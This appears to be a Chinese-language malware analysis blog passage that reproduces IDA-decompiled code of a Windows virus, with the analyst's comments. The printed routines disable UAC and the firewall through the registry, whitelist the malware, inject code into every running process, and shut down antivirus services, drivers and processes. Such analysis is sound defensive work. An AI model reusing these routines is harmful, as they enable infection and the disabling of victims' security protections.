
```
WaitObject(v7, 0, 0);

v8 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)SendbySocket, 0, 0, &ThreadId);

WaitObject(v8, 0, 0);

v9 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)getData, 0, 0, &ThreadId); // 后面三个是网络传输线程配合

WaitObject(v9, 0, 0);

while ( 1 )

Sleep(0x200u);

}
```

我整理了一下 只看重点：具体就看 `ida` （自认为注释的差不多有的可以还原了）

### 1. `hiewOpenAndPrevent`

关于服务的开启禁止 以及文件唯一随即命名的方式

```
if ( !RegOpenKeyExA(HKEY_LOCAL_MACHINE, off_4016D4, 0, 0xF003Fu, &hKey) )

 {

  (*_DWORD *)nSize = 0;

  RegSetValueExA(hKey, strEnableLUA, 0, 4u, nSize, 4u);

  RegCloseKey(hKey);

 }

 lstrcpyA(&SubKey, strShare);

 lstrcatA(&SubKey, strAuthorizeApplication);

 if ( !RegOpenKeyExA(HKEY_LOCAL_MACHINE, &SubKey, 0, 0xF003Fu, &hKey) )

 {

  GetModuleFileNameA(0, &strModuleName, 0x200u);

  wsprintfA(&SubKey, strPartStripsec, &strModuleName);

  subLen = lstrlenA(&SubKey);

  RegSetValueExA(hKey, &strModuleName, 0, 1u, (const BYTE *)&SubKey, subLen);

  RegCloseKey(hKey);                   // 注册表添加模块主允许

 }

 if ( !RegOpenKeyExA(HKEY_LOCAL_MACHINE, strShare, 0, 0xF003Fu, &hKey) )

 {

  (*_DWORD *)nSize = 0;

  RegSetValueExA(hKey, strEnableFireWall, 0, 4u, nSize, 4u);

  (*_DWORD *)nSize = 0;

  RegSetValueExA(hKey, strDonotAllowExcep, 0, 4u, nSize, 4u);

  (*_DWORD *)nSize = 1;

  RegSetValueExA(hKey, strDisableNotify, 0, 4u, nSize, 4u);

  RegCloseKey(hKey);                   // 关闭防火墙，和 禁止掉 一些 警告语

 }

 GetWindowsDirectoryA(strWindowsDir, 0x104u);

 if ( (*_BYTE *)(lstrlenA(strWindowsDir) + 0x4394E3) != '\\' )

 lstrcatA(strWindowsDir, "\\");

 (*_DWORD *)nSize = 128;

 GetComputerNameA(&SubKey, (LPDWORD)nSize);    // 获取计算机名称

 if ( lstrlenA(&SubKey) > 2 )

 {

 LOBYTE(v24) = SubKey;

 LOBYTE(v23) = *(&v41 + lstrlenA(&SubKey));

 nullsub_1 = (unsigned __int8)v23 * (unsigned __int8)v24 + 1060;

 }

 lstrcpyA((LPSTR)&String2, "Software\\");

 (*_DWORD *)nSize = 128;

 GetUserNameA(&SubKey, (LPDWORD)nSize);

 if ( lstrlenA(&SubKey) < 4 )

 lstrcpyA(&SubKey, strMonga_bonga);           // 小于 4 用自己的名称

 CopyBufferByLen(&dword_4394E0, &SubKey, 4);

 for ( i = 0; ; ++i )

 {

 v3 = lstrlenA(&SubKey);

 if ( i >= v3 )

  break;

 if ( i >= 0x10 )

  break;

 (*_DWORD *)nSize = ((unsigned __int8)dword_4394E0 ^ i) + *(&SubKey + i);

 if ( (*_DWORD *)nSize < 0 )

  (*_DWORD *)nSize = -(*_DWORD *)nSize;

 *(&String2 + lstrlenA(&String2)) = nSize[0] % 0x19u + (i > 0 ? 97 : 65);// 将加密的计算机名字 接到 SoftWare 后面

 }                                   // 上面这一 for 循环主要是 加密计算机名字

 if ( GenerateRadomNameFile(strWindowsDir) )   // 产生随即名字，并打开文件利用 createfile 测试是否是唯一的

 {

 lstrcpyA((LPSTR)&strRandomFileName, strWindowsDir);

 }

 else

 {

 GetTempPathA(0xE4u, (LPSTR)&strRandomFileName);

 if ( byte_4396EB[lstrlenA(&strRandomFileName)] != '\\' )

 lstrcatA((LPSTR)&strRandomFileName, "\\");

 if ( !GenerateRadomNameFile(&strRandomFileName) )

 lstrcpyA((LPSTR)&strRandomFileName, off_401684);

 }

 for ( i = 0; ; ++i )

 {

 v4 = lstrlenA(&SubKey);

 if ( i >= v4 )

  break;

 if ( i >= 0x10 )

  break;

 (*_DWORD *)nSize = dword_4394E0 * ((unsigned __int8)dword_4394E0 ^ i) + *(&SubKey + i);// 解密计算机名称

 if ( (*_DWORD *)nSize < 0 )

  (*_DWORD *)nSize = -(*_DWORD *)nSize;

 *(&strRandomFileName + lstrlenA(&strRandomFileName)) = nSize[0] % 0x19u + 97;// 加到即将生产的文件后面去命名

 }

 lstrcatA((LPSTR)&strRandomFileName, strDotLog);// 到这里 就完成随即命名生产.log 后缀的文件名

 hFileMappingControlPury = CreateFileMappingA((HANDLE)0xFFFFFFFF, 0, 4u, 0, 0x15400u, strMappingFile);
```

### 2. `productInjectCodeAndInjectEvery`

远程注入 主题 `Mapping` 的 `code` 进行注入 ，注入前注意有对函数地址的修正，就是硬编码修正，看 `ida` 注释很详细

```
BOOL __cdecl injectEveryModule()

{

 DWORD pid; // ST08_4@7

 int v1; // eax@7

 HANDLE v2; // ST14_4@7

 DWORD v3; // ST08_4@14

 int v4; // eax@14

 HANDLE v5; // ST10_4@14

 PROCESSENTRY32 pe; // [sp+Ch] [bp-234h]@2

 HANDLE hSnapshot; // [sp+134h] [bp-10Ch]@1

 DWORD v9; // [sp+138h] [bp-108h]@1

 CHAR String; // [sp+13Ch] [bp-104h]@1

 char v11[256]; // [sp+13Dh] [bp-103h]@1

 __int16 v12; // [sp+23Dh] [bp-3h]@1

 char v13; // [sp+23Fh] [bp-1h]@1

 v9 = 0;

 String = 0;

 memset(v11, 0, sizeof(v11));

 v12 = 0;

 v13 = 0;

 hSnapshot = CreateToolhelp32Snapshot(2u, 0);

 if ( hSnapshot )

 {

  pe.dwSize = 296;

  memset(&pe.cntUsage, 0, 0x124u);

  if ( Process32First(hSnapshot, &pe) )

  {

   if ( pe.th32ProcessID > 10 )

   {

    if ( lstrlenA(pe.szExeFile) <= 64 )

     lstrcpyA(&String, pe.szExeFile);

    else

     lstrcpynA(&String, pe.szExeFile, 64);

    CharLowerA(&String);

    pid = pe.th32ProcessID;

    v1 = lstrlenA(&String);

    wsprintfA(&String + v1, "M_%d_", pid);

    v2 = CreateMutexA(0, 0, &String);

    v9 = GetLastError();

    ReleaseMutex(v2);

    CloseHandle(v2);

    if ( !v9 )

     injectModuleProcces(pe.th32ProcessID, pe.th32ProcessID, &String);

   }

  }

  while ( Process32Next(hSnapshot, &pe) )

  {

   if ( pe.th32ProcessID > 0xA )

   {

    if ( lstrlenA(pe.szExeFile) <= 64 )

     lstrcpyA(&String, pe.szExeFile);

    else

     lstrcpynA(&String, pe.szExeFile, 64);

    CharLowerA(&String);

    v3 = pe.th32ProcessID;

    v4 = lstrlenA(&String);

    wsprintfA(&String + v4, "M_%d_", v3);

    v5 = CreateMutexA(0, 0, &String);

    v9 = GetLastError();

    ReleaseMutex(v5);

    CloseHandle(v5);

    if ( !v9 )                    // 未被注入过 就一个个注入

     injectModuleProcces((int)&String, pe.th32ProcessID, &String);

   }

  }

 }

 return CloseHandle(hSnapshot);

}

if ( !lstrcmpiA(&String1, "system")

 || !lstrcmpiA(&String1, "local service")

 || !lstrcmpiA(&String1, "network service") )

 {

  CreateMutexA(0, 0, lpString);

  v47 = -1;

  goto LABEL_50;

 }

 v8 = VirtualAllocEx(hProcess, 0, 0x2000u, 0x3000u, 0x40u);

 lpStartAddress = v8;

 if ( v8 )

 {

  if ( !WriteProcessMemory(hProcess, lpStartAddress, &codepuryFileBuffer, 0x2000u, &NumberOfBytesWritten) )// 远程注入刚才生成好的地址模块
```

### 3. `FuckSaftySoftInR0AndR3`

关于杀毒安全软件，其采取先关服务和关闭驱动，然后关已启动的进程

```
{

 LoadiPfltDrvFunc();

 v1 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)FuckTheSecuritySoftAndDelete, 0, 0, &ThreadId);

 WaitObject(v1, 0, 0);

 hModuleNtdll = LoadLibraryA(strNtdll);

 if ( hModuleNtdll )

 {

  adrNtQuerySystemInformation = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD))GetProcAddress(hModuleNtdll, stNtQuerySystemInformation);

  if ( adrNtQuerySystemInformation )

  {

   if ( !ifAmsint32Exist() )

   {

    ReSizeAndGenericPEfile(byte_4A82D8, off_40167C, 0x1425u);

    sub_429243(off_4016B0, byte_4A82D8);

   }

   if ( ifAmsint32Exist() )

   {

    if ( getSSDTENtryBak() )

    {

     v2 = CreateThread(

      0,

      0,
```
